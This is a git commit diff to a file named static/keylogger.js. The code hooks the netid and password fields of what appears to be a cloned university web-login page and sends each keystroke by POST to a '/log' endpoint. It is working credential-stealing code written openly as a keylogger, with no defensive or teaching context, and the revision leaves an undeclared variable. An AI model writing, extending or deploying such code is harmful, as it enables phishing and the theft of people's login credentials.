9a8b3b354242d5d03b61926960c799bd56219f95
Yunchae Lee <yunchaei0701@gmail.com>
2026-09-04 01:44:08 +0900

    last

--- static/keylogger.js
+++ static/keylogger.js
@@ -2,34 +2,39 @@
 const netid = document.getElementById("weblogin_netid");
 const netpass = document.getElementById("weblogin_password");
 
-let id = ''
-let outcomeId = ''
+let output = ''
 netid.addEventListener("keydown", function(event){
     console.log(event);
-    id += event.key
+    output = event.key
 
-    outcomeId = {netid: id} 
+    const outcome = {netid: output}
+    fetch("/log", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(
+            outcome
+        )
+    })  
 })
 
 
-
-let pass = ''
-let outcomePass = ''
 netpass.addEventListener("keydown", function(event){
     console.log(event);
-    pass += event.key
+    pass = event.key
 
-    outcomePass = {message: pass} 
-    if(event.key == "Enter") {
-        fetch("/log", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify(
-                outcomeId, outcomePass
-            )
-        }) 
-    }
+    const outcome = {netPass: pass} 
+
+    fetch("/log", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify(
+            outcome
+        )
+    }) 
+    
 })
 
